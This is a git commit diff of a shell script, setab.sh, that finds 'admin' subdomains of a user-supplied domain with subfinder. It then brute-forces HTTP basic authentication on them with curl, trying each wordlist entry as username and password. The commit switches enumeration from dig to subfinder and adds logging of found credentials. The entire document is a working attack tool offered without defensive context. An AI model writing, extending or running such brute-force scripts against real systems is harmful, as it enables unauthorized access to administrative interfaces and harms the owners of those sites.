64342305a50c90a11d4c679f467c68e1df5b31ea
Tommaso Bona <piergeolo@gmail.com>
2023-01-17 23:34:26 +0100

    Update setab.sh

--- setab.sh
+++ setab.sh
@@ -3,23 +3,33 @@
 # Prompt the user for a URL
 read -p "Enter a URL: " url
 
-# Use the `dig` command to find subdomains
-subdomains=$(dig $url +short | grep -v $url | grep "admin")
+# Use the `subfinder` command to find subdomains
+subdomains=$(subfinder -d $url -silent | grep "admin")
 
 # Print the subdomains
 echo "Subdomains containing 'admin':"
 echo $subdomains
+
+# Log file
+logfile="./brute-force.log"
 
 # Loop through the subdomains
 for sub in $subdomains; do
   # Read the wordlist file
   while read line; do
     # Perform the brute force attack
-    echo "Bruteforcing $sub"
+    echo "Trying $line:$line on $sub"
     status_code=$(curl -s -o /dev/null -w "%{http_code}" --user "$line:$line" $sub)
     if [ $status_code -eq 200 ]; then
       echo "Credentials found: $line:$line"
+      echo "Credentials found: $line:$line" >> $logfile
       break
+    elif [ $status_code -eq 403 ]; then
+      echo "Invalid credentials: $line:$line"
+      echo "Invalid credentials: $line:$line" >> $logfile
+    else
+      echo "Error: $status_code"
+      echo "Error: $status_code" >> $logfile
     fi
   done < wordlist.txt
 done
